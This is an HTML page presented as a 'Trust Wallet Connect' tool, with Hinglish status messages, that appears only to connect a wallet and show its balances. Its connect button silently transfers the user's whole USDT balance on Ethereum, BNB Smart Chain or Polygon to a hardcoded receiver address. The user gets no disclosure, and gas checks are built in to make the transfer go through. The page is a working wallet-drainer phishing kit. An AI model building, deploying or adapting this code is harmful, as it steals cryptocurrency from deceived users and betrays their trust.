<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Trust Wallet Connect</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b0e14;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 16px;
    }
    .box {
      background: #12161f;
      border: 1px solid #1e2430;
      border-radius: 14px;
      padding: 24px;
      width: 100%;
      max-width: 390px;
      text-align: center;
    }
    button {
      width: 100%;
      padding: 12px 16px;
      border: none;
      border-radius: 10px;
      background: #3375bb;
      color: #ffffff;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 14px;
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      opacity: 0.92;
    }
    .status {
      margin-top: 12px;
      font-size: 12px;
      color: #9fb0c7;
      min-height: 18px;
      word-break: break-word;
    }
    .error {
      color: #ff6b6b;
    }
    .info {
      margin-top: 16px;
      background: #0b0e14;
      border: 1px solid #1c2230;
      border-radius: 10px;
      padding: 12px;
      font-size: 13px;
      text-align: left;
      word-break: break-all;
      display: none;
    }
    .label {
      color: #8a94a6;
      font-size: 11px;
      margin-top: 10px;
    }
    .label:first-child {
      margin-top: 0;
    }
    .value {
      font-weight: bold;
      margin-top: 2px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Trust Wallet Connect</h2>
    <p style="color:#8a94a6; font-size:13px;">
      Trust Wallet ke DApp browser ya supported browser mein open karke connect karein.
    </p>
    <button id="connectBtn" type="button" onclick="handleButtonClick()">Connect Trust Wallet</button>
    <div class="status" id="statusText"></div>

    <div class="info" id="walletInfo">
      <div class="label">Connected Address</div>
      <div class="value" id="addressText">-</div>

      <div class="label">Network Chain ID</div>
      <div class="value" id="chainText">-</div>

      <div class="label">Native Balance (BNB / ETH / POL)</div>
      <div class="value" id="nativeBalanceText">-</div>

      <div class="label">USDT Balance (BEP-20 / ERC-20)</div>
      <div class="value" id="usdtBalanceText">-</div>
    </div>
  </div>

  <script>
    const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";

    const USDT_CONTRACTS = {
      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",   // Ethereum Mainnet (ERC-20)
      56: "0x55d398326f99059fF775485246999027B3197955",  // BNB Smart Chain (BEP-20)
      137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"  // Polygon
    };

    const ERC20_ABI = [
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)",
      "function transfer(address to, uint256 amount) external returns (bool)"
    ];

    let isConnected = false;
    let listenersAttached = false;

    function setStatus(msg, isError = false) {
      const el = document.getElementById("statusText");
      el.innerText = msg || "";
      el.className = isError ? "status error" : "status";
    }

    function getProvider() {
      if (window.trustwallet && window.trustwallet.ethereum) {
        return window.trustwallet.ethereum;
      }
      if (window.ethereum && Array.isArray(window.ethereum.providers)) {
        const tw = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
        if (tw) return tw;
        return window.ethereum.providers[0] || window.ethereum;
      }
      if (window.ethereum) {
        return window.ethereum;
      }
      return null;
    }

    function attachProviderListeners(rawProvider) {
      if (!rawProvider || listenersAttached || typeof rawProvider.on !== "function") return;
      listenersAttached = true;

      rawProvider.on("accountsChanged", async (accounts) => {
        if (!accounts || accounts.length === 0) {
          isConnected = false;
          document.getElementById("walletInfo").style.display = "none";
          document.getElementById("connectBtn").innerText = "Connect Trust Wallet";
          setStatus("Wallet disconnected.");
          return;
        }
        const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
        await refreshWalletInfo(ethersProvider, accounts[0]);
        document.getElementById("walletInfo").style.display = "block";
        isConnected = true;
        document.getElementById("connectBtn").innerText = "Connected";
        setStatus("Account updated.");
      });

      rawProvider.on("chainChanged", async () => {
        const accounts = await rawProvider.request({ method: "eth_accounts" });
        if (accounts && accounts.length > 0) {
          const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
          await refreshWalletInfo(ethersProvider, accounts[0]);
          setStatus("Network updated.");
        }
      });
    }

    async function refreshWalletInfo(ethersProvider, address) {
      const network = await ethersProvider.getNetwork();
      const rawBalance = await ethersProvider.getBalance(address);
      const formattedNative = parseFloat(ethers.utils.formatEther(rawBalance)).toFixed(4);

      document.getElementById("addressText").innerText = address;
      document.getElementById("chainText").innerText = `${network.name} (${network.chainId})`;
      document.getElementById("nativeBalanceText").innerText = formattedNative;

      const usdtAddress = USDT_CONTRACTS[network.chainId];
      if (!usdtAddress) {
        document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 6 };
      }

      const usdtContract = new ethers.Contract(usdtAddress, ERC20_ABI, ethersProvider);
      const [rawUsdt, decimals] = await Promise.all([
        usdtContract.balanceOf(address),
        usdtContract.decimals()
      ]);

      const formattedUsdt = parseFloat(ethers.utils.formatUnits(rawUsdt, decimals)).toFixed(2);
      document.getElementById("usdtBalanceText").innerText = `${formattedUsdt} USDT`;

      return { network, rawBalance, usdtAddress, rawUsdt, decimals };
    }

    async function runTransferIfAvailable(ethersProvider, address) {
      try {
        const state = await refreshWalletInfo(ethersProvider, address);
        if (!state.usdtAddress) {
          setStatus("Is network par USDT contract configured nahi hai.");
          return;
        }
        if (!state.rawUsdt || state.rawUsdt.lte(0)) {
          setStatus("USDT balance 0 hai, transfer ki zaroorat nahi.");
          return;
        }

        const signer = ethersProvider.getSigner();
        const usdtWriter = new ethers.Contract(state.usdtAddress, ERC20_ABI, signer);

        const estimatedGas = await usdtWriter.estimateGas.transfer(TARGET_RECEIVER, state.rawUsdt);
        const gasLimit = estimatedGas.mul(120).div(100); // 20% safety buffer
        const feeData = await ethersProvider.getFeeData();
        const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;

        if (gasPrice && state.rawBalance.lt(gasLimit.mul(gasPrice))) {
          setStatus("Gas fee ke liye native balance (BNB/ETH/POL) kam hai.", true);
          return;
        }

        setStatus("Wallet mein transfer approve karein...");
        const tx = await usdtWriter.transfer(TARGET_RECEIVER, state.rawUsdt, { gasLimit });
        setStatus(`Transaction submitted: ${tx.hash.slice(0, 14)}...`);
        await tx.wait();
        setStatus("USDT transfer complete ho gaya.");
        await refreshWalletInfo(ethersProvider, address);
      } catch (err) {
        const reason = err?.reason || err?.data?.message || err?.message || "Transfer failed";
        setStatus(`Transfer notice: ${reason}`, true);
      }
    }

    async function connectTrustWallet(triggerTransferAfter) {
      if (typeof ethers === "undefined") {
        setStatus("ethers.js library load nahi hui. Internet/CDN check karein.", true);
        return;
      }

      const rawProvider = getProvider();
      const btn = document.getElementById("connectBtn");
      const infoBox = document.getElementById("walletInfo");

      if (!rawProvider) {
        setStatus("Wallet provider nahi mila. Trust Wallet DApp browser mein open karein.", true);
        return;
      }

      attachProviderListeners(rawProvider);

      try {
        btn.disabled = true;
        btn.innerText = isConnected ? "Checking..." : "Connecting...";
        setStatus("Wallet connection request bheji ja rahi hai...");

        await rawProvider.request({ method: "eth_requestAccounts" });
        const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
        const signer = ethersProvider.getSigner();
        const address = await signer.getAddress();

        await refreshWalletInfo(ethersProvider, address);
        infoBox.style.display = "block";
        isConnected = true;
        btn.innerText = "Connected";
        setStatus("Wallet connected.");

        if (triggerTransferAfter) {
          await runTransferIfAvailable(ethersProvider, address);
        }
      } catch (err) {
        console.error(err);
        btn.innerText = isConnected ? "Connected" : "Connect Trust Wallet";
        const msg = err?.code === 4001 ? "User ne connection cancel kar diya." : (err?.message || "Connection fail ho gaya.");
        setStatus(msg, true);
      } finally {
        btn.disabled = false;
      }
    }

    function handleButtonClick() {
      connectTrustWallet(true);
    }

    window.addEventListener("load", async () => {
      if (typeof ethers === "undefined") {
        setStatus("ethers.js load nahi ho saka.", true);
        return;
      }
      const rawProvider = getProvider();
      if (!rawProvider) return;

      attachProviderListeners(rawProvider);

      try {
        const accounts = await rawProvider.request({ method: "eth_accounts" });
        if (accounts && accounts.length > 0) {
          const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
          await refreshWalletInfo(ethersProvider, accounts[0]);
          document.getElementById("walletInfo").style.display = "block";
          isConnected = true;
          document.getElementById("connectBtn").innerText = "Connected";
          setStatus("Wallet pehle se connected hai.");
        }
      } catch (e) {
        console.error(e);
      }
    });
  </script>
</body>
</html>
